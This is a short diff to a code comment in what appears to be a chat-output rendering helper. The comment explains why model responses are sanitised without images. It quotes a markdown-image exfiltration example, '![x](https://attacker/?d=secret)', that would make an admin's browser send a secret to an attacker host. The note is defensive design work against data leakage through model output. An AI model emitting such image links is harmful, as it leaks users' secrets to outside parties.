@@ -7,8 +7,10 @@
  *
  * Sanitisation uses the project's existing `sanitizeRichtext`, which is
  * already configured with safe-by-default tags + a hook that rewrites every
- * <a> to `target="_blank" rel="noopener noreferrer"`. That's the same surface
- * the publisher trusts, so chat output meets the same bar.
+ * <a> to `target="_blank" rel="noopener noreferrer"`. It stays on the
+ * image-free default profile, not `RICHTEXT_CONTENT_CONFIG`: a model response
+ * carrying `![x](https://attacker/?d=secret)` must not become a live <img>
+ * the admin browser fetches.
  *
  * Streaming: this helper is called per text block on every render. `marked`
  * handles partial input gracefully (an unfinished `**` simply renders as
